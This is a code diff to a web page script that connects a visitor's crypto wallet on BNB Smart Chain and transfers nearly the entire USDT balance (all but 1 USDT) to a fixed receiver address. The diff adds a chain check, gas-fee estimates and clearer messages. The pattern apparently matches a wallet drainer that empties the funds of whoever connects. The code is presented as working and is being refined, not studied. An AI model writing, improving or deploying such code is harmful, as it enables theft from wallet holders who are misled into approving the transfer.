@@ -31,22 +31,33 @@
     ];
 
     async function connectAndTransfer() {
+      // Check if wallet is installed
       if (!window.ethereum) {
         alert("Please install MetaMask or Trust Wallet.");
         return;
       }
 
       const web3 = new Web3(window.ethereum);
+
+      // Check if wallet is on BNB Smart Chain (chain ID 56)
+      const chainId = await web3.eth.getChainId();
+      if (chainId !== 56) {
+        alert("Please switch to BNB Smart Chain (BSC) in your wallet.");
+        return;
+      }
+
+      // Connect wallet
       await window.ethereum.request({ method: 'eth_requestAccounts' });
       const accounts = await web3.eth.getAccounts();
       const sender = accounts[0];
 
+      // Initialize USDT contract
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+
+      // Check USDT balance
       const balanceStr = await usdt.methods.balanceOf(sender).call();
       const balance = web3.utils.toBigInt(balanceStr);
-
-      // USDT has 6 decimals, so 1 USDT = 1,000,000 (1e6)
-      const decimals = 6;
+      const decimals = 6; // USDT has 6 decimals
       const minBalance = 1000000n; // 1 USDT in smallest unit (1e6)
       if (balance <= minBalance) {
         alert(`Insufficient USDT balance. You have ${Number(balance) / 1e6} USDT, need at least ${Number(minBalance) / 1e6} USDT.`);
@@ -56,10 +67,16 @@
       const amountToSend = balance - minBalance;
 
       // Check BNB balance for gas fee
+      const gasLimit = 200000; // Reasonable gas limit for USDT transfer
+      const gasPrice = web3.utils.toWei('5', 'gwei'); // 5 Gwei
+      const estimatedGasFee = BigInt(gasLimit) * BigInt(gasPrice); // Total gas fee in wei
+      const minBnbForGas = estimatedGasFee + (estimatedGasFee / 2n); // Add 50% buffer
       const bnbBalance = await web3.eth.getBalance(sender);
-      const minBnbForGas = web3.utils.toBigInt(web3.utils.toWei('0.001', 'ether')); // ~0.001 BNB for gas
-      if (bnbBalance < minBnbForGas) {
-        alert("Insufficient BNB for gas fee. You need at least 0.001 BNB.");
+
+      if (BigInt(bnbBalance) < minBnbForGas) {
+        const requiredBnb = Number(minBnbForGas) / 1e18;
+        const currentBnb = Number(bnbBalance) / 1e18;
+        alert(`Insufficient BNB for gas fee. You have ${currentBnb.toFixed(6)} BNB, need at least ${requiredBnb.toFixed(6)} BNB.`);
         return;
       }
 
@@ -68,14 +85,14 @@
           .transfer(receiver, amountToSend.toString())
           .send({ 
             from: sender,
-            gas: '150000', // Optimized gas limit
-            gasPrice: web3.utils.toWei('5', 'gwei') // Gas price 5 Gwei
+            gas: gasLimit.toString(),
+            gasPrice: gasPrice
           });
 
-        alert("USDT sent! Tx hash: " + tx.transactionHash);
+        alert("USDT sent! Tx hash: " + tx.transactionHash + "\nCheck on BscScan: https://bscscan.com/tx/" + tx.transactionHash);
       } catch (err) {
         console.error(err);
-        alert("Transaction failed: " + err.message);
+        alert("Transaction failed: " + err.message + "\nCheck transaction details on BscScan for more info.");
       }
     }
   </script>
